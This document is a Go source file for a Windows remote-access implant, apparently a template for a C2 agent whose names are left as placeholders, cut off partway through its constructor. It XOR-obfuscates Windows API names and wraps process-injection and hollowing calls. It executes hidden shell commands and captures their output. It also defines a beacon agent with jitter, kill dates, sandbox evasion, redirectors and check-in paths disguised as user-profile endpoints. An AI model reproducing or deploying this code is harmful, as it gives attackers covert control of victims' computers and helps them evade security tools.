package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/fernet/fernet-go"
	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
	"github.com/Ne0nd0g/go-clr"
)

// Obfuscation function for runtime deobfuscation
func deobfuscateString(obfuscated []byte, key byte) string {
	result := make([]byte, len(obfuscated))
	for i := 0; i < len(obfuscated); i++ {
		result[i] = obfuscated[i] ^ key
	}
	return string(result)
}

const (
	PROCESS_CREATE_THREAD = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION = 0x0008
	PROCESS_VM_WRITE = 0x0020
	PROCESS_VM_READ = 0x0010
	PROCESS_SUSPEND_RESUME = 0x0800
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE = 0x04

	// For kernel32.dll functions
	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME

	// For process enumeration
	TH32CS_SNAPPROCESS = 0x00000002
	MAX_PATH = 260

	// For process creation
	CREATE_NEW_CONSOLE = 0x00000010
	CREATE_NO_WINDOW = 0x08000000
	STARTF_USESHOWWINDOW = 0x00000001
	STARTF_USESTDHANDLES = 0x00000100
	SW_HIDE = 0

	// For pipe creation
	FILE_ATTRIBUTE_NORMAL = 0x00000080
	INVALID_HANDLE_VALUE = 0xFFFFFFFF

	// For process hollowing
	IMAGE_DOS_SIGNATURE = 0x5A4D
	IMAGE_NT_SIGNATURE = 0x00004550
	IMAGE_FILE_MACHINE_I386 = 0x014c
	IMAGE_FILE_MACHINE_AMD64 = 0x8664
	IMAGE_FILE_RELOCS_STRIPPED = 0x0001
	IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002
	IMAGE_FILE_MACHINE_UNKNOWN = 0
)

var (
	// Obfuscated DLL names and API functions
	obfuscatedKernel32DLL = []byte{0x29, 0x27, 0x30, 0x2c, 0x27, 0x2e, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "kernel32.dll"
	obfuscatedNtdllDLL = []byte{0x2c, 0x36, 0x26, 0x2e, 0x2e, 0x6c, 0x26, 0x2e, 0x2e} // "ntdll.dll"
	obfuscatedUser32DLL = []byte{0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "user32.dll"
	obfuscatedOpenProcess = []byte{0x0d, 0x32, 0x27, 0x2c, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "OpenProcess"
	obfuscatedVirtualAllocEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x03, 0x2e, 0x2e, 0x2d, 0x21, 0x07, 0x3a} // "VirtualAllocEx"
	obfuscatedWriteProcessMemory = []byte{0x15, 0x30, 0x2b, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "WriteProcessMemory"
	obfuscatedCreateRemoteThread = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x10, 0x27, 0x2f, 0x2d, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "CreateRemoteThread"
	obfuscatedVirtualProtectEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x12, 0x30, 0x2d, 0x36, 0x27, 0x21, 0x36, 0x07, 0x3a} // "VirtualProtectEx"
	obfuscatedCreateToolhelp32Snapshot = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2d, 0x2d, 0x2e, 0x2a, 0x27, 0x2e, 0x32, 0x71, 0x70, 0x11, 0x2c, 0x23, 0x32, 0x31, 0x2a, 0x2d, 0x36} // "CreateToolhelp32Snapshot"
	obfuscatedProcess32First = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x04, 0x2b, 0x30, 0x31, 0x36, 0x15} // "Process32FirstW"
	obfuscatedProcess32Next = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x0c, 0x27, 0x3a, 0x36, 0x15} // "Process32NextW"
	obfuscatedCreateProcess = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x15} // "CreateProcessW"
	obfuscatedResumeThread = []byte{0x10, 0x27, 0x31, 0x37, 0x2f, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "ResumeThread"
	obfuscatedSuspendThread = []byte{0x11, 0x37, 0x31, 0x32, 0x27, 0x2c, 0x26, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "SuspendThread"
	obfuscatedGetThreadContext = []byte{0x05, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "GetThreadContext"
	obfuscatedSetThreadContext = []byte{0x11, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "SetThreadContext"
	obfuscatedReadProcessMemory = []byte{0x10, 0x27, 0x23, 0x26, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "ReadProcessMemory"
	obfuscatedNtUnmapViewOfSection = []byte{0x0c, 0x36, 0x17, 0x2c, 0x2f, 0x23, 0x32, 0x14, 0x2b, 0x27, 0x35, 0x0d, 0x24, 0x11, 0x27, 0x21, 0x36, 0x2b, 0x2d, 0x2c} // "NtUnmapViewOfSection"
	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
	obfuscatedFreeConsole = []byte{0x04, 0x30, 0x27, 0x27, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27} // "FreeConsole"
	obfuscatedGetExitCodeProcess = []byte{0x05, 0x27, 0x36, 0x07, 0x3a, 0x2b, 0x36, 0x01, 0x2d, 0x26, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "GetExitCodeProcess"
	obfuscatedCreatePipe = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x2b, 0x32, 0x27} // "CreatePipe"
	obfuscatedReadFile = []byte{0x10, 0x27, 0x23, 0x26, 0x04, 0x2b, 0x2e, 0x27} // "ReadFile"

	// XOR key for deobfuscation
	obfuscationKey = byte(0x42)

	// DLL and procedure handles
	kernel32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedKernel32DLL, obfuscationKey))
	ntdll = syscall.NewLazyDLL(deobfuscateString(obfuscatedNtdllDLL, obfuscationKey))
	user32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedUser32DLL, obfuscationKey))
	procOpenProcess = kernel32.NewProc(deobfuscateString(obfuscatedOpenProcess, obfuscationKey))
	procVirtualAllocEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualAllocEx, obfuscationKey))
	procWriteProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedWriteProcessMemory, obfuscationKey))
	procCreateRemoteThread = kernel32.NewProc(deobfuscateString(obfuscatedCreateRemoteThread, obfuscationKey))
	procVirtualProtectEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualProtectEx, obfuscationKey))
	procCreateToolhelp32Snapshot = kernel32.NewProc(deobfuscateString(obfuscatedCreateToolhelp32Snapshot, obfuscationKey))
	procProcess32First = kernel32.NewProc(deobfuscateString(obfuscatedProcess32First, obfuscationKey))
	procProcess32Next = kernel32.NewProc(deobfuscateString(obfuscatedProcess32Next, obfuscationKey))
	procCreateProcess = kernel32.NewProc(deobfuscateString(obfuscatedCreateProcess, obfuscationKey))
	procResumeThread = kernel32.NewProc(deobfuscateString(obfuscatedResumeThread, obfuscationKey))
	procSuspendThread = kernel32.NewProc(deobfuscateString(obfuscatedSuspendThread, obfuscationKey))
	procGetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedGetThreadContext, obfuscationKey))
	procSetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedSetThreadContext, obfuscationKey))
	procReadProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedReadProcessMemory, obfuscationKey))
	procNtUnmapViewOfSection = ntdll.NewProc(deobfuscateString(obfuscatedNtUnmapViewOfSection, obfuscationKey))
	procFreeConsole = kernel32.NewProc(deobfuscateString(obfuscatedFreeConsole, obfuscationKey))
	procShowWindow = user32.NewProc(deobfuscateString(obfuscatedShowWindow, obfuscationKey))
	procGetConsoleWindow = kernel32.NewProc(deobfuscateString(obfuscatedGetConsoleWindow, obfuscationKey))
	procGetExitCodeProcess = kernel32.NewProc(deobfuscateString(obfuscatedGetExitCodeProcess, obfuscationKey))
	procCreatePipe = kernel32.NewProc(deobfuscateString(obfuscatedCreatePipe, obfuscationKey))
	procReadFile = kernel32.NewProc(deobfuscateString(obfuscatedReadFile, obfuscationKey))
)

// PROCESSENTRY32 structure for process enumeration
type PROCESSENTRY32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [MAX_PATH]uint16
}

// Windows structures for PE parsing and process hollowing
type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                   uint16
	MajorLinkerVersion      uint8
	MinorLinkerVersion      uint8
	SizeOfCode              uint32
	SizeOfInitializedData   uint32
	SizeOfUninitializedData uint32
	AddressOfEntryPoint     uint32
	BaseOfCode              uint32
	BaseOfData              uint32
	ImageBase               uint32
	SectionAlignment      uint32
	FileAlignment         uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion     uint16
	MinorImageVersion     uint16
	MajorSubsystemVersion uint16
	MinorSubsystemVersion uint16
	Win32VersionValue     uint32
	SizeOfImage           uint32
	SizeOfHeaders         uint32
	CheckSum              uint32
	Subsystem             uint16
	DllCharacteristics    uint16
	SizeOfStackReserve    uint32
	SizeOfStackCommit     uint32
	SizeOfHeapReserve     uint32
	SizeOfHeapCommit      uint32
	LoaderFlags           uint32
	NumberOfRvaAndSizes   uint32
	DataDirectory         [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                   uint16
	MajorLinkerVersion      uint8
	MinorLinkerVersion      uint8
	SizeOfCode              uint32
	SizeOfInitializedData   uint32
	SizeOfUninitializedData uint32
	AddressOfEntryPoint     uint32
	BaseOfCode              uint32
	ImageBase               uint64
	SectionAlignment      uint32
	FileAlignment         uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion     uint16
	MinorImageVersion     uint16
	MajorSubsystemVersion uint16
	MinorSubsystemVersion uint16
	Win32VersionValue     uint32
	SizeOfImage           uint32
	SizeOfHeaders         uint32
	CheckSum              uint32
	Subsystem             uint16
	DllCharacteristics    uint16
	SizeOfStackReserve    uint64
	SizeOfStackCommit     uint64
	SizeOfHeapReserve     uint64
	SizeOfHeapCommit      uint64
	LoaderFlags           uint32
	NumberOfRvaAndSizes   uint32
	DataDirectory         [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS32 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name            [8]uint8
	VirtualSize     uint32
	VirtualAddress  uint32
	SizeOfRawData   uint32
	PointerToRawData uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations uint16
	NumberOfLinenumbers uint16
	Characteristics uint32
}

type SECURITY_ATTRIBUTES struct {
	NLength              uint32
	LPSecurityDescriptor uintptr
	bInheritHandle       uint32
}

type PROCESS_INFORMATION struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}

type STARTUPINFO struct {
	Cb            uint32
	_             *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             *byte
	StdInput      uintptr
	StdOutput     uintptr
	StdError      uintptr
}

type CONTEXT struct {
	ContextFlags uint32
	/* Additional fields depending on architecture */
	/* For x64 */
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
	Rip uint64
	/* Control flags */
	EFlags uint32
	/* Segment values */
	Cs, Ss, Ds, Es, Fs, Gs uint16
}

func createToolhelp32Snapshot(flags uint32, processID uint32) uintptr {
	ret, _, _ := procCreateToolhelp32Snapshot.Call(
		uintptr(flags),
		uintptr(processID),
	)
	return ret
}

func process32First(snapshot uintptr, pe *PROCESSENTRY32) bool {
	ret, _, _ := procProcess32First.Call(
		snapshot,
		uintptr(unsafe.Pointer(pe)),
	)
	return ret != 0
}

func process32Next(snapshot uintptr, pe *PROCESSENTRY32) bool {
	ret, _, _ := procProcess32Next.Call(
		snapshot,
		uintptr(unsafe.Pointer(pe)),
	)
	return ret != 0
}

func createProcess(applicationName *uint16, commandLine *uint16, processAttributes, threadAttributes *syscall.SecurityAttributes, inheritHandles bool, creationFlags uint32, environment uintptr, currentDirectory *uint16, startupInfo *STARTUPINFO, processInformation *PROCESS_INFORMATION) error {
	var inheritHandlesInt int32 = 0
	if inheritHandles {
		inheritHandlesInt = 1
	}
	ret, _, callErr := procCreateProcess.Call(
		uintptr(unsafe.Pointer(applicationName)),
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(unsafe.Pointer(processAttributes)),
		uintptr(unsafe.Pointer(threadAttributes)),
		uintptr(inheritHandlesInt),
		uintptr(creationFlags),
		environment,
		uintptr(unsafe.Pointer(currentDirectory)),
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(processInformation)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

// executeCommandHidden executes a Windows command with the window hidden and captures output using pipes
func executeCommandHidden(command string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("executeCommandHidden only supported on Windows")
	}

	// Create anonymous pipes for capturing output
	var saAttr SECURITY_ATTRIBUTES
	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
	saAttr.bInheritHandle = 1 // Set inherit handle to true
	saAttr.LPSecurityDescriptor = 0

	// Create stdout pipe
	var stdoutRead, stdoutWrite uintptr
	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stdoutRead)),
		uintptr(unsafe.Pointer(&stdoutWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		return "", fmt.Errorf("failed to create stdout pipe")
	}

	// Create stderr pipe
	var stderrRead, stderrWrite uintptr
	ret, _, _ = procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stderrRead)),
		uintptr(unsafe.Pointer(&stderrWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		return "", fmt.Errorf("failed to create stderr pipe")
	}

	// Prepare the command line
	var cmdLine *uint16
	shell := fmt.Sprintf("cmd /C %s", command)
	cmdLine, err := syscall.UTF16PtrFromString(shell)
	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Initialize STARTUPINFO structure with pipe handles
	var si STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
	si.ShowWindow = SW_HIDE // Hide the window
	si.StdInput = 0        // Use default input
	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)

	// Initialize PROCESS_INFORMATION structure
	var pi PROCESS_INFORMATION

	// Create the process with hidden window and redirected output
	err = createProcess(
		nil, // applicationName
		cmdLine, // commandLine
		nil, // processAttributes
		nil, // threadAttributes
		true, // inheritHandles - important for pipe inheritance
		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
		0, // environment
		nil, // currentDirectory
		&si, // startupInfo
		&pi, // processInformation
	)

	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Close the write handles in parent after process creation since child now has them
	syscall.CloseHandle(syscall.Handle(stdoutWrite))
	syscall.CloseHandle(syscall.Handle(stderrWrite))

	// Close process and thread handles when done
	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	// Set up channels to read stdout and stderr concurrently to prevent pipe buffer overflow
	stdoutChan := make(chan []byte)
	stderrChan := make(chan []byte)

	// Read stdout concurrently
	go func() {
		var stdoutBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit - same as non-Windows version

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stdoutRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stdoutChan <- stdoutBytes
	}()

	// Read stderr concurrently
	go func() {
		var stderrBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit - same as non-Windows version

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stderrRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stderrBytes = append(stderrBytes, buffer[:remaining]...)
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stderrChan <- stderrBytes
	}()

	// Wait for the process to complete with a timeout to prevent hanging
	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 60000) // 60 second timeout
	if err != nil || result == syscall.WAIT_TIMEOUT {
		// If timeout occurs, try to terminate the process gracefully
		syscall.TerminateProcess(syscall.Handle(pi.Process), 255)
		return fmt.Sprintf("[ERROR] Command execution timed out after 60 seconds"), nil
	}

	// Get the output from both channels
	stdoutBytes := <-stdoutChan
	stderrBytes := <-stderrChan

	// Close the read handles
	syscall.CloseHandle(syscall.Handle(stdoutRead))
	syscall.CloseHandle(syscall.Handle(stderrRead))

	output := string(stdoutBytes) + string(stderrBytes)

	// Get the exit code of the process
	var exitCode uint32
	procGetExitCodeProcess.Call(
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&exitCode)),
	)

	// If no output and process exited with error, return error info
	if len(output) == 0 && exitCode != 0 {
		return fmt.Sprintf("[ERROR] Command execution failed with exit code: %d", exitCode), nil
	}

	if output == "" {
		return "[Command executed successfully - no output]", nil
	}

	return output, nil
}

func resumeThread(threadHandle uintptr) (uint32, error) {
	ret, _, callErr := procResumeThread.Call(threadHandle)
	if ret == 0xFFFFFFFF {
		return 0, callErr
	}
	return uint32(ret), nil
}

func suspendThread(threadHandle uintptr) (uint32, error) {
	ret, _, callErr := procSuspendThread.Call(threadHandle)
	if ret == 0xFFFFFFFF {
		return 0, callErr
	}
	return uint32(ret), nil
}

func getThreadContext(threadHandle uintptr, context *CONTEXT) error {
	ret, _, callErr := procGetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

func setThreadContext(threadHandle uintptr, context *CONTEXT) error {
	ret, _, callErr := procSetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

func readProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesRead *uintptr) bool {
	ret, _, _ := procReadProcessMemory.Call(
		process,
		baseAddress,
		buffer,
		size,
		uintptr(unsafe.Pointer(numberOfBytesRead)),
	)
	return ret != 0
}

func ntUnmapViewOfSection(processHandle uintptr, baseAddress uintptr) uint32 {
	ret, _, _ := procNtUnmapViewOfSection.Call(
		processHandle,
		baseAddress,
	)
	return uint32(ret)
}

func openProcess(desiredAccess uint32, inheritHandle int32, processId uint32) uintptr {
	ret, _, _ := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(inheritHandle),
		uintptr(processId),
	)
	return ret
}

func virtualAllocEx(process uintptr, address uintptr, size uintptr, allocationType uint32, protect uint32) uintptr {
	ret, _, _ := procVirtualAllocEx.Call(
		process,
		address,
		size,
		uintptr(allocationType),
		uintptr(protect),
	)
	return ret
}

func writeProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesWritten *uintptr) bool {
	ret, _, _ := procWriteProcessMemory.Call(
		process,
		baseAddress,
		buffer,
		size,
		uintptr(unsafe.Pointer(numberOfBytesWritten)),
	)
	return ret != 0
}

func createRemoteThread(process uintptr, threadAttributes uintptr, stackSize uintptr, startAddress uintptr, parameter uintptr, creationFlags uint32, threadId *uint32) uintptr {
	ret, _, _ := procCreateRemoteThread.Call(
		process,
		threadAttributes,
		stackSize,
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(threadId)),
	)
	return ret
}

func virtualProtectEx(process uintptr, address uintptr, size uintptr, newProtect uint32, oldProtect *uint32) bool {
	ret, _, _ := procVirtualProtectEx.Call(
		process,
		address,
		size,
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	return ret != 0
}

type {AGENT_STRUCT_NAME} struct {
	{AGENT_C2_URL_FIELD}                string
	{AGENT_ID_FIELD}                    string
	{AGENT_HEADERS_FIELD}               map[string]string
	{AGENT_HEARTBEAT_INTERVAL_FIELD}    int
	{AGENT_JITTER_FIELD}                float64
	{AGENT_REGISTER_URI_FIELD}          string
	{AGENT_TASKS_URI_FIELD}             string
	{AGENT_RESULTS_URI_FIELD}           string
	{AGENT_INTERACTIVE_URI_FIELD}       string
	{AGENT_INTERACTIVE_STATUS_URI_FIELD} string
	{AGENT_RUNNING_FIELD}               bool
	{AGENT_INTERACTIVE_MODE_FIELD}      bool
	{AGENT_HOSTNAME_FIELD}              string
	{AGENT_USERNAME_FIELD}              string
	{AGENT_OSINFO_FIELD}                string
	{AGENT_SECRET_KEY_FIELD}            *fernet.Key
	{AGENT_CURRENT_INTERACTIVE_TASK_FIELD} string
	{AGENT_DISABLE_SANDBOX_FIELD}       bool
	{AGENT_KILL_DATE_FIELD}             string
	{AGENT_WORKING_HOURS_FIELD}         struct {
		StartHour int      `json:"start_hour"`
		EndHour   int      `json:"end_hour"`
		Timezone  string   `json:"timezone"`
		Days      []int    `json:"days"`
	}
	{AGENT_REDIRECTOR_HOST_FIELD}       string
	{AGENT_REDIRECTOR_PORT_FIELD}       int
	{AGENT_USE_REDIRECTOR_FIELD}        bool
	{AGENT_FAILOVER_URLS_FIELD}         []string
	{AGENT_USE_FAILOVER_FIELD}          bool
	{AGENT_CURRENT_C2_URL_FIELD}        string
	{AGENT_CURRENT_FAIL_COUNT_FIELD}    int
	{AGENT_MAX_FAIL_COUNT_FIELD}        int
	{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} time.Time
	{AGENT_IN_FAILOVER_ATTEMPT_FIELD}   bool
}

type {TASK_STRUCT_NAME} struct {
	{TASK_ID_FIELD}      int64  `json:"id"`
	{TASK_COMMAND_FIELD} string `json:"command"`
}

type {TASK_RESULT_STRUCT_NAME} struct {
	{TASK_RESULT_TASK_ID_FIELD} string `json:"task_id"`
	{TASK_RESULT_RESULT_FIELD}  string `json:"result"`
}

type {API_RESPONSE_STRUCT_NAME} struct {
	Status   string      `json:"status"`
	Tasks    []{TASK_STRUCT_NAME}      `json:"tasks,omitempty"`
	Interval int         `json:"checkin_interval,omitempty"`
	Jitter   float64     `json:"jitter,omitempty"`
	InteractiveMode bool `json:"interactive_mode,omitempty"`
	Command  string      `json:"command,omitempty"`
	TaskID   string      `json:"task_id,omitempty"`
}

func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, redirectorPort int, useRedirector bool, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
	var fernetKey fernet.Key

	if secretKey != "" {
		key, err := fernet.DecodeKey(secretKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decode secret key: %v", err)
		}
		fernetKey = *key
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = "unknown"
	}

	osInfo := runtime.GOOS + " " + runtime.GOARCH

	agent := &{AGENT_STRUCT_NAME}{
		{AGENT_C2_URL_FIELD}:               c2URL,
		{AGENT_ID_FIELD}:             agentID,
		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Go C2 Agent"},
		{AGENT_HEARTBEAT_INTERVAL_FIELD}:   60,
		{AGENT_JITTER_FIELD}:              0.2,
		{AGENT_REGISTER_URI_FIELD}:         "/api/users/register",
		{AGENT_TASKS_URI_FIELD}:            "/api/users/{agent_id}/profile",
		{AGENT_RESULTS_URI_FIELD}:          "/api/users/{agent_id}/activity",
		{AGENT_INTERACTIVE_URI_FIELD}:      "/api/users/{agent_id}/settings",
		{AGENT_INTERACTIVE_STATUS_URI_FIELD}: "/api/users/{agent_id}/status",
		{AGENT_HOSTNAME_FIELD}:            hostname,
		{AGENT_USERNAME_FIELD}:            username,
		{AGENT_OSINFO_FIELD}:              osInfo,
		{AGENT_SECRET_KEY_FIELD}:           &fernetKey,
		{AGENT_INTERACTIVE_MODE_FIELD}:     false,
		{AGENT_RUNNING_FIELD}:             false,
		{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}: "",
		{AGENT_DISABLE_SANDBOX_FIELD}:      disableSandbox,
		{AGENT_KILL_DATE_FIELD}:            "{KILL_DATE}",
		{AGENT_WORKING_HOURS_FIELD}:        struct {
			StartHour int      `json:"start_hour"`
			EndHour   int      `json:"end_hour"`
			Timezone  string   `json:"timezone"`
			Days      []int    `json:"days"`
		}{
			StartHour: {WORKING_HOURS_START_HOUR},
			EndHour:   {WORKING_HOURS_END_HOUR},
			Timezone:  "{WORKING_HOURS_TIMEZONE}",
			Days:      []int{{WORKING_HOURS_DAYS}},
		},
		{AGENT_REDIRECTOR_HOST_FIELD}:       redirectorHost,
		{AGENT_REDIRECTOR_PORT_FIELD}:       redirectorPort,
